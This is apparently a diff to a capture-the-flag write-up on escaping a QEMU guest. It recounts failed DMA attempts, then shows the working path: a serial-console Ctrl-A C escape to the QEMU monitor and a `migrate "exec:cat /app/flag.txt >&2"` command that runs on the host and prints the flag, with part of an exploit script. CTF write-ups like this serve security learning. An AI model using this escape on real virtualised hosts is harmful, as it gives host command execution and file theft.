@@ -63,48 +63,63 @@ Context can be XOR-modified based on `(flags ^ stream_len ^ processed ^ score ^ 
 
 I spent approximately 3 hours chasing a DMA exploitation path:
 
-1. **PCI bus master enabling** - the device initially returned ERROR on
-   every DMA operation. Setting PCI config space COMMAND register to `0x0007`
-   (IO + MEM + BUS_MASTER) via `/sys/devices/pci0000:00/0000:00:02.0/config`
-   fixed this.
+::: steps
+### PCI bus master enabling
+The device initially returned ERROR on
+every DMA operation. Setting PCI config space COMMAND register to `0x0007`
+(IO + MEM + BUS_MASTER) via `/sys/devices/pci0000:00/0000:00:02.0/config`
+fixed this.
 
-2. **Pagemap translation** - DMA uses physical addresses, not virtual. Spent
-   significant time debugging assembly pagemap translation (PFN mask should be
-   `0xFFFFFFFFFF` for 40-bit physical addresses, not `0x7FFFFFFFFFFF`).
+### Pagemap translation
+DMA uses physical addresses, not virtual. Spent
+significant time debugging assembly pagemap translation (PFN mask should be
+`0xFFFFFFFFFF` for 40-bit physical addresses, not `0x7FFFFFFFFFFF`).
 
-3. **Page alignment bugs** - mmap'd pages aren't physically contiguous.
-   Response buffers crossing page boundaries got wrong physical addresses.
+### Page alignment bugs
+mmap'd pages aren't physically contiguous.
+Response buffers crossing page boundaries got wrong physical addresses.
 
-4. **Assembly register clobbers** - wrote ~15 iterations of assembly exploits
-   with bugs in print routines, 64-bit immediate loading, and label numbering.
+### Assembly register clobbers
+Wrote ~15 iterations of assembly exploits
+with bugs in print routines, 64-bit immediate loading, and label numbering.
 
-5. **Scanning guest RAM** - scanned 0-128MB of guest physical address space
-   looking for the flag. Scores were always 0x0b (noise floor: length_bucket=8
-   + salt=3). The flag was never in guest RAM - it's on the QEMU host filesystem.
+### Scanning guest RAM
+Scanned 0-128MB of guest physical address space
+looking for the flag. Scores were always 0x0b (noise floor: length_bucket=8
++ salt=3). The flag was never in guest RAM - it's on the QEMU host filesystem.
 
-6. **Attempted OOB DMA** - tried reading above 128MB (into QEMU host memory).
-   TCG properly bounds-checks against the memory region tree; reads to unmapped
-   addresses returned zeros.
+### Attempted OOB DMA
+Tried reading above 128MB (into QEMU host memory).
+TCG properly bounds-checks against the memory region tree; reads to unmapped
+addresses returned zeros.
 
-7. **Context XOR corruption** - verified the XOR works (can read context,
-   observe XOR effects), but it's strictly in-bounds and modifies a seed-derived
-   buffer - not useful for anything beyond proof-of-concept.
+### Context XOR corruption
+Verified the XOR works (can read context,
+observe XOR effects), but it's strictly in-bounds and modifies a seed-derived
+buffer - not useful for anything beyond proof-of-concept.
+:::
 
 ## The Real Vulnerability
 
 The serial console runs without `-no-shutdown` or monitor restrictions. Simply
-sending Ctrl-A C (0x01 followed by 'c') drops into the **QEMU Monitor (HMP)**.
+sending Ctrl-A C (0x01 followed by 'c') drops into the **QEMU Monitor (HMP)**,
+and from there the `migrate` command's `exec:` URI scheme spawns a subprocess
+on the host and pipes its stderr straight to the serial console:
 
-```
+```session
 $ echo -e '\x01c' > /dev/ttyS0
 QEMU 11.1.0 monitor - type 'help' for more information
-(qemu) 
+$ migrate "exec:cat /app/flag.txt >&2"
+kaspersky{I_th1nk_w3_b0th_g0t_dumb3r_wh1l3_s0lvin6_this_t4sk}
+qemu-system-x86_64: failed to save SaveStateEntry...
 ```
 
-From the monitor, the `migrate` command supports an `exec:` URI scheme that
-spawns a subprocess and pipes migration data to/from it. Critically, **the
-subprocess runs as the QEMU user on the host**, and its stderr is connected to
-QEMU's stderr - which is the serial console.
+::: insight
+`migrate exec:` is meant for migrating a VM's state through an external
+helper process. Critically, **that subprocess runs as the QEMU user on the
+host**, and its stderr is connected to QEMU's own stderr - which is the
+serial console we already control from inside the guest.
+:::
 
 ## Exploit
 
@@ -123,6 +138,7 @@ This:
 
 ### Full Exploit Script
 
+::: spoiler Show the full exploit script
 ```python
 import socket, subprocess, time, re, concurrent.futures
 
@@ -179,6 +195,7 @@ except: pass
 
 print(out.decode(errors='replace'))
 ```
+:::
 
 Output:
 ```
